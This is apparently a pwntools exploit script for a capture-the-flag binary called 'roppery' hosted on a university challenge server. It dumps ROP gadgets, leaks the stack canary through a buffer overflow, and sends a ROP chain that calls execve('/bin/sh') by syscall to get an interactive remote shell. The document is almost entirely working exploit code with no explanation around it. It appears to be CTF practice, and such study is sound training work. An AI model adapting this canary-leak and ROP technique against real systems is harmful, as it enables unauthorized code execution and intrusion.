'''checkeck
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
from pwn import *

DEBUG = 0
if DEBUG ==1:    
    context.log_level = "debug"

biname = "./roppery"
context.binary = exe = ELF(biname)

'''
rop = ROP(exe)
for addr, gadget in rop.gadgets.items():
    print(hex(addr), gadget.insns)
IT PRINTS
0x401017 ['add esp, 8', 'ret']
0x401016 ['add rsp, 8', 'ret']
0x401330 ['leave', 'ret']
0x401242 ['pop r13', 'pop rcx', 'pop rax', 'ret']
0x401248 ['pop r14', 'pop r15', 'ret']
0x40124a ['pop r15', 'ret']
0x40123e ['pop rax', 'pop rdx', 'ret']
0x401245 ['pop rax', 'ret']
0x401243 ['pop rbp', 'pop rcx', 'pop rax', 'ret']
0x40121d ['pop rbp', 'ret']
0x401244 ['pop rcx', 'pop rax', 'ret']
0x401241 ['pop rdi', 'pop r13', 'pop rcx', 'pop rax', 'ret'] NEEDED
0x40124b ['pop rdi', 'ret']
0x40123f ['pop rdx', 'ret']
0x401247 ['pop rsi', 'pop r14', 'pop r15', 'ret']
0x401249 ['pop rsi', 'pop r15', 'ret']                        NEEDED
0x40101a ['ret']
0x40124d ['syscall']                                            NEEDED


'''
rdi_r13_rcx_rax = p64(0x401241)
rsi_r15 = p64(0x401249)
rdx = p64(0x40123f)
scall = p64(0x40124d)
binsh = p64(0x4040CF + 55)

#p = process(biname)
p = remote("cyberchallenge.diag.uniroma1.it", "5102")
p.recvuntil(b'>')
p.send(b'1\n')
p.recvuntil(b">")
payload = b"A"*41
p.send(payload)

#leaked canary
canary_leak = p.recvline()
print(canary_leak)
canary = b"\x00" + canary_leak[59:66]
print(canary)

payload = b"yes" + b"\x00" + b"A"*36 + b"\x00"
p.send(payload)
p.recvuntil(b"Ok, here is your canary, have a nice day!")
p.recvuntil(b'>')

p.sendline(b"2")
p.recvuntil(b">")
payload = b"yes" + b"\x00" + b"P"*36 + p64(u64(canary)) + b"B"*8 + rdi_r13_rcx_rax
payload += binsh
payload += p64(0) + p64(0) + p64(59) + rsi_r15 + p64(0) + p64(0) + rdx + p64(0) + scall

p.send(payload)
p.interactive()